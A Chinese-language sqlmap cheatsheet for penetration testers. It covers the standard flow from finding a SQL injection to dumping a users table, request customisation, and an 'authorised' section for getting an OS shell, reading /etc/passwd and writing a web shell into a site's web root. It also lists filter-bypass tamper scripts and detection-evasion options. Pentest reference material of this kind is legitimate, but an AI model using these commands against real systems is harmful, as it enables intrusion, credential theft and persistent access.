# sqlmap Cheatsheet

## 标准流程

```bash
# 1. 探测
sqlmap -u "http://t.com/x?id=1" --batch
# 2. 确认注入点后列库
sqlmap -u "..." --dbs --batch
# 3. 列表/列/数据
sqlmap -u "..." -D db --tables --batch
sqlmap -u "..." -D db -T users --columns --batch
sqlmap -u "..." -D db -T users --dump --batch
```

## 请求定制（实战最常用）

```bash
sqlmap -r request.txt --batch          # 从 Burp 抓包文件读请求（首选）
sqlmap -u "..." --data "user=a&pass=b" # POST 数据
sqlmap -u "..." --cookie="PHPSESSID=x" --level 2
sqlmap -u "..." --headers="X-Forwarded-For: *"  # 头部注入点
sqlmap -u "..." -p username            # 只测指定参数
```

`--level 1~5`（payload 广度）`--risk 1~3`（风险度），组合 `--level 3 --risk 2` 覆盖大部分。

## 提权与拿 shell（授权前提）

```bash
sqlmap -u "..." --os-shell     # 需要写权限 + 知道路径
sqlmap -u "..." --file-read "/etc/passwd"
sqlmap -u "..." --file-write ./shell.php --file-dest /var/www/html/s.php
sqlmap -u "..." --current-user --is-dba
```

## 绕过与隐匿

```bash
--tamper=space2comment                 # 空格过滤
--tamper=between,randomcase            # 组合 tamper
--random-agent                          # 随机 UA
--delay=1 --threads=1                   # 慢速，避免触发风控
--proxy=http://127.0.0.1:8080           # 过 Burp 看流量
```

## 常用选项备忘

- `--batch` 全自动默认答案（脚本化必备）
- `--technique=BU` 指定技术（B 布尔/U 联合/E 报错/T 时间/S 堆叠）
- `--dbms=mysql` 指定数据库类型，提速
- `--flush-session` 清缓存重新探测
- `--purge-output` 清空历史输出目录
